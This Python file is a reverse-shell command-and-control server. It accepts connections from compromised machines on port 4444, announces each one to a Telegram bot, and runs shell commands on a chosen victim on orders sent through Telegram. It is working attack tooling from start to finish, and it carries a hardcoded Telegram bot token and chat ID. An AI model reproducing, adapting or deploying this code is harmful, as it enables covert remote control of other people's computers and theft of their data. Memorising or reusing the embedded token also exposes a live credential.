import socket
import threading
import requests

# Telegram Bot Configuration
BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"
CHAT_ID = "7416312733"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Listener Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Port for reverse shell connections

# Global dictionary to track connected clients
clients = {}

# Send a message to Telegram
def send_telegram_message(message):
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(TELEGRAM_API_URL, data=payload)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# Send help message with all commands
def send_help_message():
    help_text = """
🤖 **Telegram Bot Commands**:

1. **/start** - Start the bot and check if the server is ready.
2. **list** - Get a list of all active clients connected to the server.
   - Format: `list`
3. **control** - Send a command to a specific client.
   - Format: `control <client_id> <command>`
   - Example: `control 1 ls`
4. **exit** - Shut down the server and disconnect all clients.
   - Format: `exit`

💡 **How it works**:
- Each client connected to the server gets a unique `client_id`.
- Use the `list` command to view active `client_id`s and their details.
- Use the `control` command to execute a shell command on a target client.

Use responsibly and ethically! 🚀
"""
    send_telegram_message(help_text)

# Handle commands from Telegram
def handle_telegram_commands():
    last_update_id = None
    while True:
        try:
            updates_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id}"
            response = requests.get(updates_url).json()

            for update in response.get('result', []):
                last_update_id = update['update_id'] + 1
                message_text = update['message']['text'].strip().lower()
                user_name = update['message']['from']['first_name']

                if message_text == "/start":
                    send_telegram_message(f"Hi {user_name}, the server is ready! Use /help to see all commands.")
                elif message_text == "/help":
                    send_help_message()
                elif message_text.startswith("list"):
                    # List all connected clients
                    active_clients = "\n".join([f"{id}: {addr}" for id, addr in clients.items()])
                    send_telegram_message(f"Active Clients:\n{active_clients}" if active_clients else "No active clients.")
                elif message_text.startswith("control"):
                    # Example: control 1 ls
                    try:
                        _, client_id, command = message_text.split(" ", 2)
                        client_id = int(client_id)
                        if client_id in clients:
                            target_conn = clients[client_id][0]
                            target_conn.send(command.encode())
                            output = target_conn.recv(4096).decode()
                            send_telegram_message(f"Output from client {client_id}:\n{output}")
                        else:
                            send_telegram_message("Invalid client ID.")
                    except Exception as e:
                        send_telegram_message(f"Error processing control command: {e}")
                elif message_text == "exit":
                    send_telegram_message("Shutting down server...")
                    exit(0)
                else:
                    send_telegram_message("Invalid command. Use /help to see all available commands.")
        except Exception as e:
            print(f"Error handling Telegram commands: {e}")
            send_telegram_message(f"Error: {e}")

# Handle each client connection
def handle_client(client_socket, client_address, client_id):
    clients[client_id] = (client_socket, client_address)
    send_telegram_message(f"New client connected: {client_id} from {client_address}")
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
    except Exception as e:
        print(f"Client {client_id} disconnected: {e}")
    finally:
        client_socket.close()
        del clients[client_id]
        send_telegram_message(f"Client {client_id} disconnected.")

# Start the listener for reverse shell connections
def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    send_telegram_message(f"Server started on {HOST}:{PORT}.")
    print(f"Listening on {HOST}:{PORT}...")

    client_id = 0
    while True:
        client_socket, client_address = server.accept()
        client_id += 1
        threading.Thread(target=handle_client, args=(client_socket, client_address, client_id), daemon=True).start()

# Main function to start the server and Telegram bot handler
def main():
    threading.Thread(target=start_listener, daemon=True).start()
    handle_telegram_commands()

if __name__ == "__main__":
    main()
